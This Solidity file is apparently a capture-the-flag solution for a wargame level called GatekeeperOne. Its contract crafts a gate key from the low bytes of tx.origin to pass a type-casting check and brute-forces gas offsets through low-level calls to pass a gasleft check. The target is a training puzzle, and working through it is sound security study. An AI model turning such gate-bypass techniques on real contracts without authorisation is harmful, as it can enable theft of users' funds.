// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}
contract GatekeeperOneAttacker1 {
    IGatekeeperOne public target;

    constructor (address _target) {
        target = IGatekeeperOne(_target);
    }

    /* function gateThreeCheck(bytes8 _gateKey) internal view returns (bool) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        return true;
    } */

    function attack() external returns (uint256, uint256) {
        // Step 1: Craft a key that passes gateThree
        // Get last 2 bytes of tx.origin
        uint16 originLower16 = uint16(uint160(tx.origin));

        // Construct key:
        // Lower 2 bytes == originLower16
        // Middle 2 bytes == 0 (so uint32 == uint16)
        // Upper 4 bytes ≠ 0 (to make uint64 != uint32)
        uint64 key = uint64(originLower16);
        key |= 0x1000000000000000; // ensure upper bits are non-zero
        bytes8 gateKey = bytes8(key);
        // Check internally if prepared key would pass gateThree
        // require(gateThreeCheck(gateKey), "Prepared key didn't pass gateThree");

        // Step 2: Brute-force gas to satisfy gateTwo
        uint256 gasToTry = 0;
        for (uint256 attempts = 1; attempts <= 1000; attempts++) {
            // try calling with varying gas offsets
            gasToTry = 8191 * 3 + attempts;
            (bool success, ) = address(target).call{gas: gasToTry} (
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                return (attempts, gasToTry);  // return number of attempts and gas used
            }
        }
        revert("No working gas found even after 1000 attempts");
    }
}